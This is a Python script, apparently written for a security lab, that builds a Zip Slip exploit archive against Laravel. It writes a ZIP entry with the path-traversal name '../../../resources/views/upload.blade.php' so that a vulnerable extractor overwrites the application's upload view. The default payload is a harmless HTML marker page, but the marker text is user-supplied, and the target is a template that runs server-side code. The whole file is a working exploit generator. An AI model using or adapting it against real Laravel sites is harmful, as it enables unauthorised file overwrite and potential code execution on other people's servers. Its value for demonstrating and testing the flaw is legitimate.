"""Build a harmless Laravel Zip Slip proof-of-concept archive."""

import argparse
from pathlib import Path
import io
import zipfile


DEFAULT_MARKER = "ZIP_SLIP_LARAVEL_PROOF_OF_CONCEPT"
TARGET = "../../../resources/views/upload.blade.php"


def build_payload(marker: str = DEFAULT_MARKER) -> bytes:
    """Create a ZIP that overwrites Laravel's upload view through traversal."""
    template = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Zip Slip Demo</title></head>
<body>
<h1>{marker}</h1>
<p>The Laravel upload view was overwritten through archive path traversal.</p>
</body>
</html>
"""

    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as bundle:
        # This traversal is intentional and limited to the isolated lab.
        bundle.writestr(TARGET, template)
    return archive.getvalue()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--marker",
        default=DEFAULT_MARKER,
        help="Text written into the overwritten Laravel view",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path(__file__).with_name("exploit.zip"),
        help="Output ZIP path",
    )
    args = parser.parse_args()

    args.output.write_bytes(build_payload(args.marker))
    print(f"[OK] Exported payload to {args.output}")


if __name__ == "__main__":
    main()
